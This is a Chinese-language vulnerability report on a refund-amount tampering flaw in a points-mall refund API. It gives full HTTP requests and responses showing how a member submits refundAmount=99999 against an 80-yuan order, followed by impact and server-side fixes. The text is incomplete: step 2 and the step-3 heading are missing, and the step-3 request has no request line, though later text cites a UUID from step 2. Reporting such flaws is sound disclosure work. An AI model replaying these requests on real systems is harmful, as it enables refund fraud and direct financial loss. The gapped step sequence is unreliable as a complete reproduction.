# 积分商城存在退款金额篡改漏洞

**漏洞名称：** 积分商城存在退款金额篡改漏洞

**漏洞等级：** 高危

**漏洞类型：** 业务逻辑 / 退款金额校验缺失

**漏洞URL：**

`https://ttt.ebanktest.com.cn:18234/emallapp/refund/addApplyRefund`

## 详细描述

售后退款申请接口的 `refundAmount` 由客户端直接提交，服务端原样写入退款单，没有和订单实付金额、可退金额 `mayRefundFee` 做校验。

实测实付 80 元的订单可以提交 `refundAmount=99999`；实付现金为 0 的纯积分订单可以提交 50000 元现金退款。退款单均返回成功，并进入待处理退款队列。

## 复现步骤

前置条件：一个普通会员会话，名下有已支付、可售后的订单。

### 第 1 步：读取服务端认定的可退金额

完整请求包：

```http
POST /emallapp/refund/intoApplyPage HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-Requested-With: XMLHttpRequest
Origin: https://ttt.ebanktest.com.cn:18234
Referer: https://ttt.ebanktest.com.cn:18234/html/10124/view/order/myOrder/orderInfo.html
Cookie: SESSION=<普通会员会话>
Content-Length: 74
Connection: close

orderNo=202606231541924930&goodsId=5540062316842230357122&orderType=refund
```

响应中记录：

```json
{"auxiliary":{"mayRefundFee":80.0,"orderPrice":80.0,"goodsPrice":80.0,"goodsPriceTotal":80.0}}
```

服务端明确知道这笔订单最多只能退 80 元。

```http

Host: ttt.ebanktest.com.cn:18234
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded;charset=utf-8
X-Requested-With: XMLHttpRequest
Origin: https://ttt.ebanktest.com.cn:18234
Referer: https://ttt.ebanktest.com.cn:18234/html/10124/view/order/myOrder/orderInfo.html
Cookie: SESSION=<普通会员会话>
Content-Length: 256
Connection: close

orderNo=202606231541924930&goodsId=5540062316842230357122&applyType=1&refundReason=%E5%8D%96%E5%AE%B6%E6%9C%AA%E5%8F%91%E8%B4%A7&addThat=111111&refundAmount=99999&refundLogiAmount=0&orderType=refund&UUID=<第 2 步返回的 UUID>&bankcode=10124&channel=007
```

其中 `refundReason=%E5%8D%96%E5%AE%B6%E6%9C%AA%E5%8F%91%E8%B4%A7` 解码后是 `卖家未发货`。

实际长度会随 UUID 长度变化，Burp 会自动重算 `Content-Length`。

响应包：

```json
{"refundNo":"202610210935375773","retshow":"新增退款申请操作成功","ispoints":true,"retcode":"0000"}
```

### 第 4 步：读回退款单，确认超额金额已落库

完整请求包：

```http
POST /emallapp/refund/getRefundDetail HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Cookie: SESSION=<普通会员会话>
Content-Length: 27
Connection: close

refundNo=202610210935375773
```

响应包关键部分：

```json
{
  "applyRefund": {
    "refundNo": "202610210935375773",
    "orderNo": "202606231541924930",
    "refundAmount": 99999.0,
    "refundStatus": "1",
    "refundReason": "卖家未发货",
    "applyTime": "2026-10-21 09:35:37"
  },
  "auxiliary": {
    "mayRefundFee": 80.0,
    "orderPrice": 80.0,
    "goodsPrice": 80.0
  },
  "retshow": "退款页面-等待买家处理！",
  "retcode": "0000"
}
```

`refundAmount=99999.0` 是客户端提交值，`mayRefundFee=80.0` 是服务端自己返回的可退上限，说明服务端有正确参照值却没有用于校验。

## 影响范围

任意登录会员可以对自己的已支付订单生成超额退款单。若售后人员按申请金额审核退款，会造成直接资金损失。

## 修复方案

1. 服务端丢弃客户端 `refundAmount`，按订单实付、优惠、历史退款和在途申请重新计算可退金额。
2. 强制校验 `0 < refundAmount <= mayRefundFee`，越界直接拒绝并记录审计日志。
3. 售后审核页面同时展示申请金额、实付金额和可退金额，差额异常时阻断一键退款。
